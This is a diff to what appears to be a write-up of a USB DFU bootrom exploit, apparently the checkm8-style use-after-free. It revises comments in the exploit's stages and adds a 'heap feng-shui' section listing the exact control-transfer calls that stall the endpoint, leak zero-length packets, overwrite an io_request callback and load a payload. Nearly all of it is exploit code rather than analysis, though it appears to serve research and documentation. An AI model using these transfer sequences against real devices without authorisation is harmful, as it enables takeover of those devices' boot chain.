@@ -27,7 +27,7 @@ def exploit():
         no_leak(device)
     
     # Send a packet that will leak a ZLP
-    leak(device)
+    usb_req_leak(device)
 
     # Send a packet that will won't leak a ZLP
     no_leak(device)
@@ -47,7 +47,7 @@ def exploit():
     # Create an incomplete data phase transfer
     libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, b'A' * 0x800, 0.0001)
 
-    # DFU abort to cause re-entry and trigger UaF
+    # DFU abort to cause re-entry and trigger UaF, also a ZLP
     libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0)
 
     # Release and give time to re-enter DFU
@@ -61,13 +61,13 @@ def exploit():
 
     device = dfu.acquire_device()
 
-    # Unsure
+    # Stall device-to-host pipe
     usb_req_stall(device)
 
-    # Unsure pt.2
+    # Send a packet that will leak a ZLP
     usb_req_leak(device)
 
-    # Overwrite io_request callback and next fields
+    # Overwrite the leaked io_request callback and next fields?
     libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, config.overwrite, 50)
 
     # Fill image buffer with payload at insecure memory base
@@ -86,4 +86,24 @@ def exploit():
     dfu.release_device(device)
 
     ## END OF STAGE 4 ##
-  ```
+```
+
+# Heap feng-shui in control transfers
+```py
+# stall() - stalls the endpoint so we can pile on allocations
+async_control_transfer(device, 0x80, 6, 0x304, 0x40A, b'A' * 0xC0, 0.00001)
+
+# no_leak() - send six packets that won't leak a ZLP
+control_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC1, 1)
+control_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC1, 1)
+control_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC1, 1)
+control_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC1, 1)
+control_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC1, 1)
+control_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC1, 1)
+
+# usb_req_leak() - send a packet that will leak a ZLP
+control_transfer(device, 0x80, 6, 0x304, 0x40A, 0x40, 1)
+
+# no_leak() - send a packet that won't leak a ZLP
+control_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC1, 1)
+```
